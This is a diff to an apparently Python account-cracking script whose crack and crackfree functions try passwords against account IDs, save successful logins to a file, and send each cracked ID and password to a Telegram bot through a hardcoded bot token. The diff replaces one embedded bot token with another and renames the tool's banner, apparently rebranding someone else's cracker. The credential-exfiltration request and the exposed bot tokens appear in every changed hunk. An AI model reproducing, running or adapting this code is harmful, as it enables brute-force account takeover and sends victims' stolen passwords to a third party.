@@ -838,7 +838,7 @@ def crack(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				requests.get("https://api.telegram.org/bot6143260559:AAEAPrCMNwHH9Dllv-vJHIc1snwdrK4r7Pw/sendMessage?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
+				requests.get("https://api.telegram.org/bot6171847020:AAEujIMq9zwipvWAFocRYqSRQtMRNP2Jmz0/sendMessage?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
 				break
 			else:
 				continue
@@ -850,7 +850,7 @@ def crack(idf,pwv):
 
 def crackfree(idf,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r {P}[HARRY-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r {P}[RAJU_xe]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -876,7 +876,7 @@ def crackfree(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				requests.get("https://api.telegram.org/bot6143260559:AAEAPrCMNwHH9Dllv-vJHIc1snwdrK4r7Pw/sendMessage?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
+				requests.get("https://api.telegram.org/bot6171847020:AAEujIMq9zwipvWAFocRYqSRQtMRNP2Jmz0/sendMessage?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
 				ok.append(wrt)
 				break
 			else:
